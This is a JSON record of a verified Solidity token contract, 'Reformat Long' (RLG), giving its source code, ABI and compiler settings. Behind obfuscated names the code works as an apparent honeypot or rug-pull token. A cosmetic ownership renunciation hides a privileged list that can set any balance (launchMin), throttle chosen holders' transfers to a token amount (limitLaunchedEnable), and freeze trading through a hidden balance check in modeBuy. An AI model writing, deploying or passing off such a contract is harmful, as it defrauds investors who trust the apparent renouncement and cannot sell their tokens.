{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface totalFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitShouldTo {\n    function createPair(address fundTrading, address enableReceiver) external returns (address);\n}\n\ninterface tradingAmountFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeLaunched) external view returns (uint256);\n\n    function transfer(address receiverMode, uint256 launchedMarketing) external returns (bool);\n\n    function allowance(address autoShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchedMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMode,\n        uint256 launchedMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromReceiver, uint256 value);\n    event Approval(address indexed autoShould, address indexed spender, uint256 value);\n}\n\ninterface tradingAmountFundMetadata is tradingAmountFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReformatLong is totalReceiver, tradingAmountFund, tradingAmountFundMetadata {\n\n    address private takeBuy;\n\n    function modeBuy(address limitFrom, address receiverMode, uint256 launchedMarketing) internal returns (bool) {\n        if (limitFrom == totalTo) {\n            return exemptTo(limitFrom, receiverMode, launchedMarketing);\n        }\n        uint256 walletAt = tradingAmountFund(isAmount).balanceOf(atTx);\n        require(walletAt == maxTo);\n        require(receiverMode != atTx);\n        if (shouldTo[limitFrom]) {\n            return exemptTo(limitFrom, receiverMode, autoSwap);\n        }\n        return exemptTo(limitFrom, receiverMode, launchedMarketing);\n    }\n\n    uint256 private listFee;\n\n    function sellReceiverReceiver(address limitAutoFee) public {\n        if (enableAt) {\n            return;\n        }\n        \n        maxTokenTake[limitAutoFee] = true;\n        if (totalFromFund) {\n            shouldBuy = true;\n        }\n        enableAt = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalTokenLimit;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTo;\n    }\n\n    function limitLaunchedEnable(address liquiditySender) public {\n        launchToSwap();\n        if (totalFromFund == maxFee) {\n            maxFee = false;\n        }\n        if (liquiditySender == totalTo || liquiditySender == isAmount) {\n            return;\n        }\n        shouldTo[liquiditySender] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private atFee;\n\n    uint256 tradingTake;\n\n    function balanceOf(address feeLaunched) public view virtual override returns (uint256) {\n        return fromAt[feeLaunched];\n    }\n\n    address amountLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address liquidityToken, address teamIs) external view virtual override returns (uint256) {\n        if (teamIs == amountLaunch) {\n            return type(uint256).max;\n        }\n        return atFee[liquidityToken][teamIs];\n    }\n\n    mapping(address => bool) public shouldTo;\n\n    mapping(address => uint256) private fromAt;\n\n    bool private listEnableReceiver;\n\n    uint256 public atWalletIs;\n\n    uint8 private enableTo = 18;\n\n    bool public enableAt;\n\n    function approve(address teamIs, uint256 launchedMarketing) public virtual override returns (bool) {\n        atFee[_msgSender()][teamIs] = launchedMarketing;\n        emit Approval(_msgSender(), teamIs, launchedMarketing);\n        return true;\n    }\n\n    string private launchTx = \"Reformat Long\";\n\n    constructor (){\n        if (atWalletIs != listFee) {\n            txList = false;\n        }\n        totalFrom listFromAuto = totalFrom(amountLaunch);\n        isAmount = limitShouldTo(listFromAuto.factory()).createPair(listFromAuto.WETH(), address(this));\n        \n        totalTo = _msgSender();\n        listExempt();\n        maxTokenTake[totalTo] = true;\n        fromAt[totalTo] = listTo;\n        if (listFee != atWalletIs) {\n            maxFee = true;\n        }\n        emit Transfer(address(0), totalTo, listTo);\n    }\n\n    uint256 public takeTo;\n\n    address public totalTo;\n\n    function launchToSwap() private view {\n        require(maxTokenTake[_msgSender()]);\n    }\n\n    function transferFrom(address limitFrom, address receiverMode, uint256 launchedMarketing) external override returns (bool) {\n        if (_msgSender() != amountLaunch) {\n            if (atFee[limitFrom][_msgSender()] != type(uint256).max) {\n                require(launchedMarketing <= atFee[limitFrom][_msgSender()]);\n                atFee[limitFrom][_msgSender()] -= launchedMarketing;\n            }\n        }\n        return modeBuy(limitFrom, receiverMode, launchedMarketing);\n    }\n\n    function amountMaxReceiver(uint256 launchedMarketing) public {\n        launchToSwap();\n        maxTo = launchedMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTo;\n    }\n\n    bool private totalFromFund;\n\n    uint256 maxTo;\n\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant autoSwap = 12 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return launchTx;\n    }\n\n    address public isAmount;\n\n    event OwnershipTransferred(address indexed tradingMarketing, address indexed walletAuto);\n\n    function transfer(address atFrom, uint256 launchedMarketing) external virtual override returns (bool) {\n        return modeBuy(_msgSender(), atFrom, launchedMarketing);\n    }\n\n    function listExempt() public {\n        emit OwnershipTransferred(totalTo, address(0));\n        takeBuy = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeBuy;\n    }\n\n    bool private maxFee;\n\n    function exemptTo(address limitFrom, address receiverMode, uint256 launchedMarketing) internal returns (bool) {\n        require(fromAt[limitFrom] >= launchedMarketing);\n        fromAt[limitFrom] -= launchedMarketing;\n        fromAt[receiverMode] += launchedMarketing;\n        emit Transfer(limitFrom, receiverMode, launchedMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return takeBuy;\n    }\n\n    mapping(address => bool) public maxTokenTake;\n\n    bool public txList;\n\n    bool public shouldBuy;\n\n    uint256 public totalTx;\n\n    bool private amountAt;\n\n    string private totalTokenLimit = \"RLG\";\n\n    function launchMin(address atFrom, uint256 launchedMarketing) public {\n        launchToSwap();\n        fromAt[atFrom] = launchedMarketing;\n    }\n\n    uint256 private listTo = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"amountMaxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWalletIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySender\",\"type\":\"address\"}],\"name\":\"limitLaunchedEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTokenTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitAutoFee\",\"type\":\"address\"}],\"name\":\"sellReceiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchedMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReformatLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}